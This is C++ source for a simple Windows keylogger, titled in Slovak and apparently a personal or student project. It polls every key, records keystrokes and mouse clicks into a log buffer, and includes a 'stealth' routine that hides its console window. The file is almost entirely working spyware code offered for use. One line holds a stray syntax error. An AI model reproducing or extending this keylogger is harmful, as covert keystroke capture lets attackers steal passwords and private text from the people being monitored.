/* Matej Kuzma, jednoduchy keylogger
Vytvorene v IDE visual studio 2017 15.3.4
pre platformu windows
*/

#include <stdio.h>
#include <windows.h>
#include "LogBuffer.h"
#include "StateMachine.h"

const char _del[5] = { '<','D','E','L','>' };
const char _click[7] = { '<','C','L','I','C','K','>' };
const char _newln = '\n';
const short _keyDownRetCode = -32767; // for output function GetAsyncKeysState()
const char caseShift = 'a' - 'A';

using namespace std;
using namespace lgbuff;
using namespace stMachn;

void showConsole()
{
	// create new console
	// allocate new console for calling process
	AllocConsole();
	// redirect output and input to console
	freopen("CONOUT$", "w", stdout);
	freopen("CONIN$", "r", stdin);
}

void hideConsole()
{
	HWND stealth;,,,
	AllocConsole();
	stealth = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(stealth, 0);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	//hideConsole();

	LogBuffer * logBuff = LogBuffer::getInstance(); // get buffer instance
	// State machine for interrupt sequence recognition
	StateMachine interruptSeq(",,,", 3); 

	unsigned int actChr, shiftChr;

	// flags
	bool upperCase = false;
	//bool newLine = false; // new lines when clicking - to keep input into possible text fields separated
	bool shiftPushed = false;

	// endless loop for input listening
	while (true) {
		// shift is special, push needs to be checked
		shiftChr = GetAsyncKeyState(VK_LSHIFT) | GetAsyncKeyState(VK_RSHIFT);
		if (shiftChr == (unsigned int)_keyDownRetCode) {
			upperCase = (shiftPushed == false) ? !upperCase : upperCase;
			shiftPushed = true;
		}
		else if (shiftChr == 0) {
			upperCase = (shiftPushed == true) ? !upperCase : upperCase;
			shiftPushed = false;
		}

		// itterate all keyboard keys and check if they are pushed
		for (actChr = 0; actChr <= 230; actChr++) {
			if (GetAsyncKeyState(actChr) == _keyDownRetCode){
			// treat special input
			if(actChr == VK_CAPITAL)// capslock
			upperCase = !upperCase;
			if(actChr == VK_RETURN){// enter
			logBuff->putChar('\n');
			}
			if(actChr == VK_LBUTTON){// mouse left
			logBuff->putChar('\n');
			logBuff->putString(_click, sizeof(_click));
			logBuff->putChar('\n');
			}

			if(actChr == VK_BACK){ // backspace
			logBuff->putString(_del, sizeof(_del));
			break;
			}

			// treat printable input
			// map keyboard codes to ASCII
			actChr = MapVirtualKey(actChr, MAPVK_VK_TO_CHAR);
			if(actChr == 0)
			continue;

			// character case treatment
			if(!upperCase && (actChr >= 65 && actChr <= 90))
			actChr += caseShift;

			// write to a buffer
			logBuff->putChar(actChr);
			if(actChr == 'Q')
			return 0;

			// check for intterupt sequence
			if(interruptSeq.stateInput(actChr))
				showConsole();

			//newLine = false;

			// issue only one key per time
			break;
			}
		}

		// dont waste performance by endless loop
		Sleep(50); // 50 miliseconds
	}
	return 0;
}

